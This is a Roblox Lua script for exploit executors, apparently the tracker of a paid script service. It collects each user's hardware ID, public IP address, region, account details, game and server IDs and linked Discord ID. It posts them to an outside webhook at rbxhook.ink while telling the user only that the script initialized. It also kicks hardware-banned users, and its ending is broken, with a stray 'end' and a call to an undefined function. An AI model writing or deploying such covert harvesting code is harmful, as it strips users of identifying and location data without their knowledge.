local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local url = "https://rbxhook.ink/r/60e53da55772d3105ea0657a7af59a00"
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end
local executor = "Unknown"
if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "Krnl"
elseif fluxus then
    executor = "Fluxus"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif OXYGEN then
    executor = "Oxygen U"
end
local hwid = "Unavailable"
pcall(function()
    if syn and syn.gethwid then
        hwid = syn.gethwid()
    elseif gethwid then
        hwid = gethwid()
    elseif fluxus and getgenv and getgenv().fluxus then
        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
    elseif delta and get_hw_id then
        hwid = tostring(get_hw_id())
    end
end)
local gameName = "Unknown"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then 
        gameName = info.Name 
    end
end)
local serverRegion = "Unknown"
pcall(function()
    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
end)
local ipAddress = "Unavailable"
pcall(function()
    local ipResponse = game:HttpGet("https://api.ipify.org")
    if ipResponse and ipResponse ~= "" then
        ipAddress = ipResponse
    end
end)
local accountAge = "Unknown"
local membership = "Free"
pcall(function()
    accountAge = tostring(player.AccountAge) .. " days"
    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
end)
local data = {
    avatar_url = "https://rbxhook.ink/img/logo.png",
    content = "",
    username = "rbxhook.ink",
    embeds = {
        {
            title = "Script Execution Report",
            color = 3447003,
            author = {
                name = player.Name,
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
            },
            fields = {
                {
                    name = "JunkieCore Premium",
                    value = "Checking premium status...",
                    inline = false
                },
                {
                    name = "Key Expiration", 
                    value = "Checking expiration time...",
                    inline = false
                },
                {
                    name = "HWID Ban Status",
                    value = "Checking ban status...",
                    inline = false
                },
                {
                    name = "Discord ID",
                    value = "Retrieving Discord ID...",
                    inline = false
                },
                {
                    name = "User Info",
                    value = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform(),
                    inline = false
                },
                {
                    name = "Executor Info", 
                    value = "Executor: " .. executor .. "\nVersion: " .. (executorVersion or "Unknown"),
                    inline = false
                },
                {
                    name = "HWID",
                    value = hwid,
                    inline = false
                },
                {
                    name = "Game Info",
                    value = "Game Name: " .. gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
                    inline = false
                },
                {
                    name = "Network Info",
                    value = "IP Address: " .. ipAddress .. "\nRegion: " .. serverRegion,
                    inline = false
                },
                {
                    name = "Account Info",
                    value = "Account Age: " .. accountAge .. "\nMembership: " .. membership,
                    inline = false
                }
            },
            footer = {
                text = "rbxhook.ink | User ID: " .. tostring(player.UserId)
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}
-- JunkieCore Premium Check
local premiumStatus = "Not checked"
if JD_IS_PREMIUM ~= nil then
    if JD_IS_PREMIUM then
        premiumStatus = "[OK] PREMIUM USER"
    else
        premiumStatus = "[STD] Standard user"
    end
else
    premiumStatus = "[NO] Not available (check key validation)"
end
for i, field in ipairs(data.embeds[1].fields) do
    if field.name == "JunkieCore Premium" then
        field.value = premiumStatus
        break
    end
end
-- JunkieCore Key Expiration Check
local expirationStatus = "Not checked"
if JD_EXPIRES_AT ~= nil then
    local currentTime = os.time()
    if currentTime < JD_EXPIRES_AT then
        local timeLeft = JD_EXPIRES_AT - currentTime
        local daysLeft = math.floor(timeLeft / 86400)
        local hoursLeft = math.floor((timeLeft % 86400) / 3600)
        local minutesLeft = math.floor((timeLeft % 3600) / 60)
        if daysLeft > 0 then
            expirationStatus = string.format("[TIME] %d days, %d hours remaining", daysLeft, hoursLeft)
        elseif hoursLeft > 0 then
            expirationStatus = string.format("[TIME] %d hours, %d minutes remaining", hoursLeft, minutesLeft)
        else
            expirationStatus = string.format("[TIME] %d minutes remaining", minutesLeft)
        end
        if daysLeft < 7 then
            warn("[WARN] Your key expires soon! Renew now to avoid interruption.")
        end
    else
        expirationStatus = "[NO] EXPIRED"
        warn("[BAN] Your key has expired! Renew to continue using the script.")
    end
else
    expirationStatus = "[LIFETIME] No expiration (lifetime key)"
end
for i, field in ipairs(data.embeds[1].fields) do
    if field.name == "Key Expiration" then
        field.value = expirationStatus
        break
    end
end
-- JunkieCore HWID Ban Check
local banStatus = "Not checked"
if type(JunkieCore) == "table" and type(JunkieCore.GetIsHwidBanned) == "function" then
    local success, isBanned = pcall(JunkieCore.GetIsHwidBanned)
    if success then
        if isBanned then
            banStatus = "[BAN] HWID BANNED"
        else
            banStatus = "[OK] HWID is clean"
        end
    else
        banStatus = "Error checking ban status"
        print("Error checking ban status: " .. tostring(isBanned))
    end
else
    banStatus = "[WARN] Check unavailable (legacy API)"
end
for i, field in ipairs(data.embeds[1].fields) do
    if field.name == "HWID Ban Status" then
        field.value = banStatus
        break
    end
end
if type(JunkieCore) == "table" and type(JunkieCore.GetIsHwidBanned) == "function" then
    local success, isBanned = pcall(JunkieCore.GetIsHwidBanned)
    if success and isBanned then
        warn("[BAN] Hardware ban detected! Terminating script...")
        game.Players.LocalPlayer:Kick("Your hardware has been banned from this service.")
        return
    end
end
-- JunkieCore Discord ID
local discordId = "Not available"
if JD_DISCORD_ID ~= nil and JD_DISCORD_ID ~= "" then
    discordId = "<@" .. JD_DISCORD_ID .. "> (" .. JD_DISCORD_ID .. ")"
else
    discordId = "[NO] Not linked"
end
for i, field in ipairs(data.embeds[1].fields) do
    if field.name == "Discord ID" then
        field.value = discordId
        break
    end
end
print("=== Runtime Variables ===")
if JD_IS_PREMIUM ~= nil then
    print("JD_IS_PREMIUM:", JD_IS_PREMIUM)
end
if JD_EXPIRES_AT ~= nil then
    print("JD_EXPIRES_AT:", JD_EXPIRES_AT)
end
if JD_DISCORD_ID ~= nil then
    print("JD_DISCORD_ID:", JD_DISCORD_ID)
end
if JD_CREATED_AT ~= nil then
    print("JD_CREATED_AT:", JD_CREATED_AT)
end
if JD_REASON ~= nil then
    print("JD_REASON:", JD_REASON)
end
local success, encoded = pcall(function()
    return HttpService:JSONEncode(data)
end)
if not success then
    print("JSON encoding failed")
    return
end
local requestFunc = syn and syn.request or request or http_request
if not requestFunc then
    print("Error: JK291-RH")
    return
end
local response = requestFunc({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = encoded
})
if response then
    print("Status:", response.StatusCode)
    if response.StatusCode == 200 or response.StatusCode == 204 then
        print("[OK] Script initialized successfully!")
    else
        print("Error: J1920-RH - (SHARE THIS TO SERVICE OWNER) : " .. response.StatusCode)
        if response.Body then
            print("Response: " .. response.Body)
        end
    end
else
    print("ERROR: No response from server")
end
end
pcall(__trackInit)
